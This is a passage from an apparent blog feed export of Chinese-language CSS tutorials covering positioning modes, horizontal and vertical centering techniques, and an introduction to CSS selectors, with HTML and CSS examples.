language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">top</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 150px<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就使板块<strong>向下</strong>移动100像素，<strong>向右</strong>移动150像素。</p><h2 id="相对定位"><a href="#相对定位" class="headerlink" title="相对定位"></a>相对定位</h2><p>这里的<strong>相对</strong>较难理解，与数理中的“相对”不太一样，这里是<strong>“相对于自己原来应在的位置”</strong>，需要设置css：<code>position:  relative;</code>，重要的是不用关心<strong>上级是否设置了position属性</strong>，这样就很方便。例如：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span><span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span><span class="token property">top</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span><span class="token property">right</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>板块就相对于自己没设置样式前的位置，同时向左向下移动100px。</p><h2 id="固定定位"><a href="#固定定位" class="headerlink" title="固定定位"></a>固定定位</h2><p>这个就好理解了，所谓<strong>固定</strong>就是指固定于整个浏览器网页窗口不动，即使滚动网页内容也不改变位置，需要设置css：<code>position: fixed</code>，也可以设置 <code>top</code>, <code>right</code>等调整固定的位置。还记得浏览器某些网页右下角的小广告吗，是不是固定在那怎么浏览网页都不动 -_- .</p>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css布局模型 绝对定位 相对定位 固定定位 position </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS 样式之内容居中方法</title>
      <link href="/2024/09/27/css/css-yang-shi-zhi-nei-rong-ju-zhong-fang-fa/"/>
      <url>/2024/09/27/css/css-yang-shi-zhi-nei-rong-ju-zhong-fang-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="水平居中"><a href="#水平居中" class="headerlink" title="水平居中"></a>水平居中</h1><p>HTML中要实现某一内容水平居中显示，要通过设置css样式来实现，主要分为<strong>行内元素</strong>和<strong>块状元素</strong>两种情况，<strong>块状元素</strong>又可分为<strong>块状定宽</strong>与<strong>块状不定宽</strong>两种情况，接下来依次介绍分析。</p><h2 id="行内元素"><a href="#行内元素" class="headerlink" title="行内元素"></a>行内元素</h2><p>像 a、span、i 这类元素叫做行内元素，<strong>文本</strong>和<strong>图片</strong>也是行内元素。行内元素水平居中方法简单，只需要给行内元素的<strong>父元素</strong>设置 <code>text-align: center;</code> css样式就内实现内容水平居中，例如：<br>html:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>txt<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>居中内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>css:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.txt</span> <span class="token punctuation">&#123;</span><span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>文本内容的<strong>父元素</strong>就是 <code>div</code> ，这样就内实现水平居中，效果如下：</p><div align="center"><b>居中内容</b></div><h2 id="块状定宽元素"><a href="#块状定宽元素" class="headerlink" title="块状定宽元素"></a>块状定宽元素</h2><p>常见块状元素有 div, p, h 等，定宽即为其设置固定宽度值 <code>width</code>，这时我们可以为元素设置 <code>margin-left</code> 和 <code>margin-right</code> 来实现水平居中，也可以简写为 <code>margin: 0 auto;</code>，例如：<br>html:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>txt<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>居中内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>css:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.txt</span> <span class="token punctuation">&#123;</span><span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span><span class="token property">margin</span><span class="token punctuation">:</span> 10px auto<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>实现效果如下：</p><div align="center"><b>居中内容</b></div><h2 id="块状不定宽"><a href="#块状不定宽" class="headerlink" title="块状不定宽"></a>块状不定宽</h2><p>有时候我们不能限制块状元素的宽度，就是块状不定宽元素，主要有三种方法，接下来一次介绍。</p><h5 id="1、加入-table-标签"><a href="#1、加入-table-标签" class="headerlink" title="1、加入 table 标签"></a>1、加入 table 标签</h5><p>利用 table 标签的<strong>长度自适应性</strong>，长度根据内容自动调整，然后通过设置 <code>margin: auto;</code> 实现水平居中，例如：<br>html:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tbody</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>txt<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>居中内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tbody</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>css:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.txt</span> <span class="token punctuation">&#123;</span><span class="token property">margin</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>效果如下：</p><div align="center"><b>居中内容</b></div><h5 id="2、设置为行内元素"><a href="#2、设置为行内元素" class="headerlink" title="2、设置为行内元素"></a>2、设置为行内元素</h5><p>就是通过设置 <code>display: inline;</code> 将块状元素设置为<strong>行内元素</strong>，然后就是像行内元素一样设置 <code>text-align: center;</code> 来是内容水平居中，例如：<br>html:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>txt<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>居中内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>css:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.txt</span> <span class="token punctuation">&#123;</span><span class="token property">display</span><span class="token punctuation">:</span> inline<span class="token punctuation">;</span><span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>效果为：</p><div align="center"><b>居中内容</b></div><p><strong>注：</strong></p><blockquote><p><strong>使用这种方法虽然可以不用像table增加无语义标签，但是改变了display，所以会少了一些功能，例如不能设置宽度。</strong></p></blockquote><h5 id="3、设置浮动和相对定位"><a href="#3、设置浮动和相对定位" class="headerlink" title="3、设置浮动和相对定位"></a>3、设置浮动和相对定位</h5><p>这种方法设置就相对复杂，同时设置<strong>浮动</strong>和<strong>相对定位</strong>来实现元素的水平居中。<br>首先设置<strong>父元素</strong>：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span> <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span> <span class="token property">left</span><span class="token punctuation">:</span> 50%<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后设置<strong>子元素</strong>：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> -50%<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过代码应该好理解，就是通过<strong>50%**那个关键位置来实现水平居中效果，因为</strong>50%**是界面的中央位置，将父元素右移，直到左边框移到中线位置，在将子元素向左移，这样子元素不就居中了吗。</p><p>这里要<strong>注意</strong>的是分别设置<strong>父元素</strong>的 <code>50%</code> 和<strong>子元素</strong>的 <code>-50%</code>。<br>实现效果如下：</p><div align="center"><b>居中内容</b></div><h1 id="垂直居中"><a href="#垂直居中" class="headerlink" title="垂直居中"></a>垂直居中</h1><p>说完水平居中接着说垂直居中，这里主要又分为两种情况：<strong>父元素高度确定的单行文本</strong> 和<strong>父元素高度确定的多行文本</strong>。</p><h2 id="单行文本"><a href="#单行文本" class="headerlink" title="单行文本"></a>单行文本</h2><p>对于<strong>父元素</strong>高度确定的单行文本，可以通过设置<strong>父元素</strong>的 <code>height</code> 和 <code>line-height</code> 高度一致来实现。</p><p>这里可以这样理解，<code>height</code> 是元素的高度，例如文本字体的高度，<code>line-height</code> 是行高，例如文本的行间距，一行文本中，行间距被<strong>分为两部分</strong>，分别位于这行文本的<strong>顶部</strong>和<strong>底部</strong>（因为行间距是两行之间的距离），所以设置 <code>height</code> 和 <code>line-height</code> <strong>一样大</strong>的话，<code>line-height</code> 就被均分为两部分，分别位于元素顶部和底部，这样中间设置为 <code>height</code> 的元素不就实现<strong>垂直居中</strong>了吗 ^_^ .</p><p>例如：<br>html:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>txt<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>居中内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>css:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.txt</span> <span class="token punctuation">&#123;</span><span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span><span class="token property">line-height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>效果如下：</p><pre>居中内容</pre><blockquote><p><strong>这里需要注意的是关键词“单行文本”，如果使用这种方法但是一行文本超过宽度限制的话，某些内容就会脱离元素块，子元素有多行的话，这几行就会并排居中，并保持设置的行高。</strong></p></blockquote><h2 id="多行文本"><a href="#多行文本" class="headerlink" title="多行文本"></a>多行文本</h2><p>对于父元素高度确定的<strong>文本</strong>和<strong>图片</strong>等内容设置垂直居中，主要有两种方法。</p><h5 id="1、使用-table-标签"><a href="#1、使用-table-标签" class="headerlink" title="1、使用 table 标签"></a>1、使用 table 标签</h5><p>对元素使用<strong>table</strong>标签，包括 tbody，tr，td，然后对父元素设置 <code>vertical-align: middle;</code> 样式，就能使 <code>inline-block</code> 类型的子元素垂直居中显示。</p><p>因为 td 标签<strong>默认</strong>设置了 <code>vertical-align: middle</code>，所以也可以不用单独设置 <code>vertical-align</code>。<br>例如：<br>html:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tbody</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>txt<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>居中内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>居中内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>居中内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tbody</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>css:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.txt</span> <span class="token punctuation">&#123;</span>        <span class="token property">height</span><span class="token punctuation">:</span> 300px<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> #ccc<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>这里的父元素就是 td，父元素的高度必须确定，就要为其设置 height。</strong></p></blockquote><p><strong>注意</strong>这里的 p 元素是 <strong>inline</strong> 类型的，所以设置 <code>vertical-align: middle</code> 的话会出现错误，若果是图片元素 img 的话，就可以设置 <code>vertical-align: middle</code>，但是由于 td 标签默认，所以都可以不写。</p><p>效果如下：</p><pre>居中内容</pre><h5 id="2、设置-table-cell"><a href="#2、设置-table-cell" class="headerlink" title="2、设置 table-cell"></a>2、设置 table-cell</h5><p>第二种方法是把要垂直居中显示的元素的父元素设置为**table-cell (表格单元)**类型：<code>display: table-cell;</code>，然后设置 <code>vertical-align: middle</code>就能实现元素垂直居中。</p><p>但是这个方法存在兼容性问题，<strong>chrome, firefox, IE8以上</strong>才支持这个操作。</p><p>例如：<br>html:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>txt<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>居中内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>居中内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>居中内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>css:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.txt</span> <span class="token punctuation">&#123;</span>        <span class="token property">height</span><span class="token punctuation">:</span> 300px<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> #ccc<span class="token punctuation">;</span><span class="token property">display</span><span class="token punctuation">:</span> table-cell<span class="token punctuation">;</span><span class="token property">vertical-align</span><span class="token punctuation">:</span> middle<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>同样，要为父元素 div 设置高度 height</strong></p></blockquote><p>效果如下：</p><pre>居中内容</pre><p>这种方法除了兼容性问题外，同时也改变了 <strong>display</strong>类型，会在某些方面带来不便。</p>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css水平居中 css垂直居中 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS 选择器详细介绍</title>
      <link href="/2024/09/27/css/css-xuan-ze-qi-xiang-xi-jie-shao/"/>
      <url>/2024/09/27/css/css-xuan-ze-qi-xiang-xi-jie-shao/</url>
      
        <content type="html"><![CDATA[<hr><p>文章出自个人博客<a href="https://knightyun.github.io/2018/05/02/css-selector">https://knightyun.github.io/2018/05/02/css-selector</a>，转载请申明</p><hr><h1 id="目录"><a href="#目录" class="headerlink" title="目录 "></a>目录 <span id="home"></h1><ul><li><a href="#1">基础</a></li><li><a href="#2">选择器</a><ul><li><a href="#2.1">元素选择器</a></li><li><a href="#2.2">类选择器</a></li><li><a href="#2.3">ID选择器</a><ul><li><a href="#2.3.1">ID选择器与类选择器的区别</a></li></ul></li><li><a href="#2.4">子选择器</a></li><li><a href="#2.5">后代选择器</a></li><li><a href="#2.6">通用选择器</a></li><li><a href="#2.7">属性选择器</a><ul><li><a href="#2.7.1">简单属性选择器</a></li><li><a href="#2.7.2">属性和值选择器</a></li></ul></li><li><a href="#2.8">伪元素选择器</a><ul><li><a href="#2.8.1">:active</a></li><li><a href="#2.8.2">:hover</a></li><li><a href="#2.8.3">:focus</a></li><li><a href="#2.8.4">::selection</a></li><li><a href="#2.8.5">:first-child</a></li><li><a href="#2.8.6">:nth-child()</a></li></ul></li><li><a href="#2.9">组选择器</a></li><li><a href="#2.10">相邻同级选择器</a></li></ul></li></ul><hr><h1 id="基础"><a href="#基础" class="headerlink" title="基础 "></a>基础 <span id="1"></h1><p>CSS（层叠样式表Cascading Style Sheets）,用于修饰HTML网页内容，根据使用位置不同可分为三种样式：<strong>内联式，嵌入式，外部式。</strong></p><ul><li><strong>内联式：</strong>标签 <code>&lt;&gt;</code>内部使用，例如：</li></ul><blockquote><p><code>&lt;p style = &quot;color: red; font-size: 20px&quot;&gt;&lt;/p&gt;</code>。</p></blockquote><ul><li><strong>嵌入式：</strong>写在 <code>&lt;style&gt;&lt;/style&gt;</code> 之中，并放在 <code>&lt;head&gt;&lt;/head&gt;</code> 内，例如：</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--这里放其它标签，例如 meta，link，script之类--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><span class="token selector">p</span> <span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>外部式：</strong>写在外部 <code>.css</code> 文件中，使用如下方式引用：</li></ul><blockquote><p><code>&lt;link rel = &quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/index.css&quot;&gt;</code><br><code>href</code> 写 <code>.css</code> 文件路径，可以是绝对路径或相对路径，相对路径类似于：<code>../../css/index.css</code>，绝对路径类似于：<code>/css/index.css</code>。</p></blockquote><h1 id="选择器（Selector）"><a href="#选择器（Selector）" class="headerlink" title="选择器（Selector）"></a>选择器（Selector）<span id="2"></h1><p>三种样式中，<strong>嵌入式</strong>和<strong>外部式</strong>需要使用到<strong>选择器</strong>，也是组成 css 样式的主体例如上例中的 <code>p &#123; &#125;</code>，主要分为：<br>元素选择器、类选择器、ID选择器、子选择器、后代选择器、通用选择器、属性选择器、伪元素选择器、组选择器、相邻同级选择器。</p><h2 id="元素选择器（Type-selector）"><a href="#元素选择器（Type-selector）" class="headerlink" title="元素选择器（Type selector）"></a>元素选择器（Type selector）<span id="2.1"></h2><p>也叫类型选择器，可以理解为<strong>标签选择器</strong>，最基本的选择器，就是使用常见的HTML元素，例如：<code>body &#123; &#125;</code>, <code>h &#123; &#125;</code>, <code>p &#123; &#125;</code>, <code>div &#123; &#125;</code>, <code>span &#123; &#125;</code>, <code>a &#123; &#125;</code> 等。</p><h2 id="类选择器（Class-selector）"><a href="#类选择器（Class-selector）" class="headerlink" title="类选择器（Class selector）"></a>类选择器（Class selector）<span id="2.2"></h2><p><strong>前提</strong>需要在标签内使用<strong>类</strong>标记某处文档，类似：<code>class = &quot;myClass&quot;</code>，然后它的选择器的格式就为：<code>.myClass &#123; &#125;</code>，就是在类名前面加个小数点。</p><h2 id="ID选择器（ID-selecctor）"><a href="#ID选择器（ID-selecctor）" class="headerlink" title="ID选择器（ID selecctor）"></a>ID选择器（ID selecctor）<span id="2.3"></h2><p>和类选择器类似，<strong>前提</strong>需要在标签内使用<strong>ID</strong>标记某处文档，类似：<code>id = &quot;myId&quot;</code>，格式为：<code>#myId &#123; &#125;</code>，就是在 ID 前加个符号 <code>#</code>。</p><blockquote><p><strong>ID选择器与类选择器的区别：</strong> <span id="2.3.1"><br>类选择器可以使用多次，ID选择器只能使用一次，例如：<br><code>&lt;p class = &quot;one&quot;&gt;This is a test content, &lt;/p&gt;</code><br><code>&lt;p class = &quot;one&quot;&gt;hello world !&lt;/p&gt;</code>，但是ID不能这样。<br>并且能同时使用多个类分别标记不同样式，例如：<code>&lt;p class = &quot;one two&quot;&gt;&lt;/p&gt;</code>，ID也不能这样。</p></blockquote><h2 id="子选择器（Child-selector）"><a href="#子选择器（Child-selector）" class="headerlink" title="子选择器（Child selector） "></a>子选择器（Child selector） <span id="2.4"></h2><p>用于指定标签元素的<strong>子元素</strong>，使用符号 <code>&gt;</code> 隔开父元素与子元素，例如：<br>HTML：</p><pre><code>&lt;p1&gt;Hello World !!!&lt;p2&gt;This is a test content&lt;/p2&gt;&lt;/p1&gt;</code></pre><p>CSS:</p><pre><code>p1&gt;p2 &#123;color: green;font-size: 20px;&#125;</code></pre><p>这里就指定了父元素 <code>p1</code> 的子元素 <code>p2</code> 的样式，但是<strong>只作用于子元素，不作用于父元素</strong>。</p><h2 id="后代选择器（Descendant-selector）"><a href="#后代选择器（Descendant-selector）" class="headerlink" title="后代选择器（Descendant selector） "></a>后代选择器（Descendant selector） <span id="2.5"></h2><p>用于指定标签元素的<strong>后代元素</strong>，使用空格符号隔开，例如：<br>html:</p><pre><code>&lt;p1&gt;Hello world !!!&lt;p2&gt;This is a &lt;a&gt;test&lt;/a&gt; content&lt;/p2&gt;&lt;/p1&gt;</code></pre><p>css:</p><pre><code>p1 a &#123;color: green;font-size: 20px;&#125;</code></pre><p>这里指定了元素 <code>p1</code> 的后代元素 <code>a</code> 的样式，注意这里不是<strong>子代元素</strong> <code>p2</code>，就是作用于<strong>所有指明的后代元素</strong>。</p><blockquote><p><strong>子代选择器与后代选择器的区别：</strong> <span id="2.5.1"><br>顾名思义的理解，后代就是包含子代在内的所有下代的元素，可以跨越子代直接作用于孙代；而子代只包含父级的<strong>第一代子代</strong>元素。<br>子代选择器使用符号 <code>&gt;</code> 隔开，后代选择器使用<code>空格</code> 隔开。</p></blockquote><h2 id="通用选择器"><a href="#通用选择器" class="headerlink" title="通用选择器 "></a>通用选择器 <span id="2.6"></h2><p>顾名思义，使用通配符 <code>*</code> 设置 html 中<strong>所有标签</strong>的样式，例如：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">*</span> <span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这样就设置了HTML中所有的标签的样式了。</p><h2 id="属性选择器（Attribute-selector）"><a href="#属性选择器（Attribute-selector）" class="headerlink" title="属性选择器（Attribute selector） "></a>属性选择器（Attribute selector） <span id="2.7"></h2><p>对<strong>具有指定的属性</strong>(attribute)设置样式，使用方括号符号 <code>[ ]</code>。</p><h3 id="简单属性选择器"><a href="#简单属性选择器" class="headerlink" title="简单属性选择器 "></a>简单属性选择器 <span id="2.7.1"></h3><p>不用管属性值，例如：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">[href]</span> <span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">&#125;</span><span class="token selector">a [href]</span> <span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">&#125;</span><span class="token selector">a [href] [title]</span> <span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>以上格式都能实现相同效果，即具有该属性的 <code>a</code> 标签。</p></blockquote><h3 id="属性和值选择器"><a href="#属性和值选择器" class="headerlink" title="属性和值选择器 "></a>属性和值选择器 <span id="2.7.2"></h3><p>具有指定属性与其<strong>指定值</strong>的标签，格式为：</p><pre><code>a [title = &quot;link&quot;] &#123;color: red&#125;</code></pre><h2 id="伪元素选择器"><a href="#伪元素选择器" class="headerlink" title="伪元素选择器 "></a>伪元素选择器 <span id="2.8"></h2><p>HTML中存在一类与元素控制内容相同的<strong>抽象元素</strong>，但是并不实际存在于HTML文档，给标签的<strong>某种状态</strong>设置样式，例如单击某内容或鼠标滑过某内容，然后设置改变的样式。伪元素种类较多，只列举几个常用例子。</p><h3 id="active"><a href="#active" class="headerlink" title=":active "></a>:active <span id="2.8.1"></h3><p>为<strong>激活</strong>的元素设置样式，就是用户单击该标签时的样式，例如：</p><pre><code>a:active &#123;color: red&#125;</code></pre><p>则用户点击这个链接文本时颜色变为红色。</p><h3 id="hover"><a href="#hover" class="headerlink" title=":hover "></a>:hover <span id="2.8.2"></h3><p>悬停状态伪元素，为用户鼠标所<strong>停靠</strong>的标签设置样式，例如：</p><pre><code>p:hover &#123;color: red&#125;</code></pre><p>则鼠标停留在该段落时，段落内容变为红色。</p><h3 id="focus"><a href="#focus" class="headerlink" title=":focus "></a>:focus <span id="2.8.3"></h3><p>用于具有<strong>焦点</strong>的元素，常用就是输入框，用户点击输入框准备输入时则该输入框就具有了焦点，例如：</p><pre><code>input:focus &#123;background-color: green&#125;</code></pre><p>则点击输入框时背景颜色变为绿色。</p><h3 id="selection"><a href="#selection" class="headerlink" title="::selection "></a>::selection <span id="2.8.4"></h3><p>为选中的元素设置样式，例如：</p><pre><code>::selection &#123;color: red&#125;</code></pre><p>为文档中鼠标选定的内容设置为红色字体。注意可以追加应用范围：<code>p::selection</code> 表示段落中选中的字体才应用该样式，不追加直接使用 <code>::selection</code> 表示应用于所有内容。<br><strong>火狐浏览器</strong>支持需要使用 <code>-moz-selection</code>。</p><h3 id="first-child"><a href="#first-child" class="headerlink" title=":first-child "></a>:first-child <span id="2.8.5"></h3><p>为元素的第一子代应用样式，例如：</p><pre><code>p:first-child &#123;color: red&#125;</code></pre><p>这个比较好理解。</p><h3 id="nth-child"><a href="#nth-child" class="headerlink" title=":nth-child() "></a>:nth-child() <span id="2.8.6"></h3><p>为元素的<strong>父元素</strong>的第 n 个子代设置样式，只是括号内需要输入数字表示第几代，例如：</p><pre><code>p:nth-child(2) &#123;color: 